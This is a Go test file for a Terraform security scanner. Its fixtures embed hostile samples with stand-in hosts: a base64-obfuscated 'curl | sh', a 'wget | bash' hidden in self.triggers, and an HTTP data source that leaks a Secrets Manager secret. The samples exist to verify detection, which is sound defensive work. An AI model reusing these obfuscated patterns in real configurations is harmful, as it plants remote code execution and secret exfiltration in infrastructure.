package analyze

import (
	"encoding/base64"
	"strings"
	"testing"

	"github.com/r-morato/tfcap/internal/model"
	"github.com/r-morato/tfcap/internal/rules"
)

func TestEvaluationRevealsHiddenPayload(t *testing.T) {
	payload := base64.StdEncoding.EncodeToString([]byte("curl -s https://drop.example.invalid/x | sh"))
	res := scanFiles(t, map[string]string{"main.tf": `
locals {
  parts = ["c", "u", "r", "l"]
  tool  = join("", local.parts)
  cmd   = base64decode("` + payload + `")
  dest  = format("https://%s.%s/%s", "collect", "example.invalid", "k")
}
data "external" "x" {
  program = ["sh", "-c", local.cmd]
}
data "http" "y" {
  url = local.dest
}
`}, true)
	var host, shell, collect bool
	for _, c := range res.Capabilities {
		ev := contains(c.Tags, "evaluated")
		switch {
		case c.RuleID == rules.NetEndpoint && c.Detail == "host:drop.example.invalid" && ev:
			host = c.Severity >= model.High && c.Address == "data.external.x"
		case c.RuleID == rules.ExecShellPattern && ev && contains(c.Tags, "download-and-execute"):
			shell = c.Severity == model.Critical && c.Phase == model.PhasePlan
		case c.RuleID == rules.NetEndpoint && c.Detail == "host:collect.example.invalid" && ev:
			collect = true
		}
	}
	if !host || !shell || !collect {
		t.Errorf("host %v shell %v collect %v\n%+v", host, shell, collect, res.Capabilities)
	}
}

func TestEvaluationQuietWhenNothingHidden(t *testing.T) {
	res := scanFiles(t, map[string]string{"main.tf": `
locals { endpoint = "https://api.example.com/v1" }
data "http" "y" { url = "${local.endpoint}/status" }
`}, true)
	for _, c := range res.Capabilities {
		if contains(c.Tags, "evaluated") {
			t.Errorf("unexpected evaluated finding: %+v", c)
		}
	}
}

func TestSecretFlows(t *testing.T) {
	res := scanFiles(t, map[string]string{"main.tf": `
variable "db_password" {}
variable "region" { default = "eu-west-2" }
variable "blob" {
  sensitive = true
}
data "aws_secretsmanager_secret_version" "s" { secret_id = "x" }
locals {
  token = data.aws_secretsmanager_secret_version.s.secret_string
  wrapped = { t = local.token }
}
data "http" "exfil" {
  url = "https://collect.example.invalid/?k=${local.wrapped.t}"
}
data "http" "api" {
  url = "https://api.example.com/v1"
  request_headers = { Authorization = "Bearer ${var.db_password}" }
}
data "http" "fine" {
  url = "https://api.example.com/${var.region}"
}
data "external" "e" {
  program = ["python3", "x.py"]
  query   = { v = var.blob }
}
resource "null_resource" "r" {
  provisioner "local-exec" {
    command     = "deploy --password ${var.db_password}"
  }
  provisioner "local-exec" {
    command     = "deploy"
    environment = { PASS = random_password.p.result }
  }
}
resource "random_password" "p" { length = 20 }
`}, true)
	got := map[string]model.Capability{}
	for _, c := range res.Capabilities {
		if strings.HasPrefix(c.RuleID, "TFCAP-FLOW") {
			got[c.Address+" "+c.Detail] = c
		}
	}
	want := map[string]model.Severity{
		"data.http.exfil flow:data.aws_secretsmanager_secret_version.s>url": model.Critical,
		"data.http.api flow:variable var.db_password>request_headers":       model.Medium,
		"data.external.e flow:sensitive variable var.blob>query":            model.High,
		"null_resource.r flow:variable var.db_password>command":             model.High,
		"null_resource.r flow:random_password.p.result>environment":         model.Medium,
	}
	for k, sev := range want {
		c, ok := got[k]
		if !ok {
			t.Errorf("missing flow %s", k)
			continue
		}
		if c.Severity != sev {
			t.Errorf("%s: severity %s, want %s", k, c.Severity, sev)
		}
	}
	if len(got) != len(want) {
		t.Errorf("got %d flows, want %d: %v", len(got), len(want), got)
	}
	if c := got["null_resource.r flow:variable var.db_password>command"]; c.Phase != model.PhaseApply {
		t.Errorf("local-exec flow phase = %s", c.Phase)
	}
}

func TestEvaluatesSelfTriggers(t *testing.T) {
	res := scanFiles(t, map[string]string{"main.tf": `
locals {
  h = join(".", ["upd", "example", "invalid"])
}
resource "null_resource" "x" {
  triggers = { cmd = "wget -qO- https://${local.h}/i | bash" }
  provisioner "local-exec" {
    command = self.triggers.cmd
  }
}
`}, true)
	found := false
	for _, c := range res.Capabilities {
		if c.RuleID == rules.NetEndpoint && c.Detail == "host:upd.example.invalid" && c.Address == "null_resource.x" {
			found = true
		}
	}
	if !found {
		t.Errorf("self.triggers command not evaluated: %+v", res.Capabilities)
	}
}
